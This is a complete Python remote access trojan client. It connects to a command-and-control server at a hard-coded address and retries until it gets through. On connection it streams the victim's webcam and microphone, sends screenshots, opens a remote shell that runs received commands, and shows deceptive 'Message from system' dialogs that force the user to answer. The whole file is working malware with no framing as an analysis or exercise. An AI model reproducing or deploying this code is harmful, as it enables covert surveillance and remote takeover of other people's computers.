import socket
import threading
import os
import time
import base64
import ctypes
import cv2
import pyaudio
import struct
from io import BytesIO
from PIL import ImageGrab
import tkinter as tk
from tkinter import simpledialog

server_ip = '192.168.1.45'  # Change to match your C2 server
server_port = 4444
cam_port = 9999
mic_port = 9998

chatting = False

def reliable_recv(sock):
    data = b""
    while True:
        part = sock.recv(4096)
        if part.endswith(b"<END>"):
            data += part[:-5]
            break
        data += part
    return data

def take_screenshot():
    image = ImageGrab.grab()
    buffered = BytesIO()
    image.save(buffered, format="PNG")
    encoded = base64.b64encode(buffered.getvalue())
    return encoded + b"<END>"

def show_message(text):
    ctypes.windll.user32.MessageBoxW(0, text, "Message from system", 0x40 | 0x0)

def stream_camera():
    print("[*] Looking for available camera...")
    cap = None
    for cam_index in range(5):
        test_cam = cv2.VideoCapture(cam_index)
        if test_cam.isOpened():
            print(f"[+] Camera found at index {cam_index}")
            cap = test_cam
            break
        test_cam.release()
    if cap is None:
        print("[!] No camera found. Skipping camera stream.")
        return

    try:
        cam_sock = socket.socket()
        cam_sock.connect((server_ip, cam_port))
        while True:
            ret, frame = cap.read()
            if not ret:
                print("[!] Failed to read frame from camera.")
                break
            _, buffer = cv2.imencode('.jpg', frame)
            data = buffer.tobytes()
            cam_sock.sendall(struct.pack('>I', len(data)) + data)
            time.sleep(0.05)
    except Exception as e:
        print(f"[!] Camera streaming failed: {e}")
    finally:
        cap.release()
        cam_sock.close()

def stream_microphone():
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100

    print("[*] Initializing microphone stream...")
    p = pyaudio.PyAudio()

    try:
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        mic_sock = socket.socket()
        mic_sock.connect((server_ip, mic_port))

        while True:
            data = stream.read(CHUNK, exception_on_overflow=False)
            mic_sock.sendall(data)

    except Exception as e:
        print(f"[!] Microphone streaming failed: {e}")
    finally:
        stream.stop_stream()
        stream.close()
        p.terminate()
        mic_sock.close()

def shell_mode(sock):
    while True:
        cmd = sock.recv(4096).decode("utf-8").strip()
        if cmd.lower() == "exit":
            break
        try:
            output = os.popen(cmd).read().encode()
        except Exception as e:
            output = str(e).encode()
        sock.send(output if output else b"[+] Command executed.\n")

def show_input_prompt(prompt):
    root = tk.Tk()
    root.withdraw()
    root.attributes('-topmost', True)
    user_input = simpledialog.askstring("Message from system", prompt, parent=root)
    while not user_input:
        user_input = simpledialog.askstring("Message from system", prompt, parent=root)
    root.destroy()
    return user_input

def chat_mode(sock):
    sock.send(b"[+] Forced chat mode activated<END>")
    try:
        while True:
            question = sock.recv(4096).decode("utf-8").strip()
            if question.lower() == "exit":
                break
            answer = show_input_prompt(question)
            sock.send(f"chat:{answer}".encode())
    except Exception as e:
        sock.send(f"chat:Error receiving question: {e}".encode())

def handle_commands(sock):
    threading.Thread(target=stream_camera, daemon=True).start()
    threading.Thread(target=stream_microphone, daemon=True).start()

    while True:
        try:
            command = sock.recv(4096).decode("utf-8").strip()
            if command == "screenshot":
                screenshot_data = take_screenshot()
                sock.send(screenshot_data)
            elif command.startswith("message"):
                _, _, msg = command.partition(" ")
                show_message(msg.strip())
                sock.send(b"[+] Message shown<END>")
            elif command == "shell":
                sock.send(b"[+] Shell mode activated<END>")
                shell_mode(sock)
            elif command == "chat":
                chat_mode(sock)
            else:
                sock.send(b"[!] Unknown command<END>")
        except Exception:
            break

def connect_to_c2(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            handle_commands(s)
            s.close()
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    connect_to_c2(server_ip, server_port)
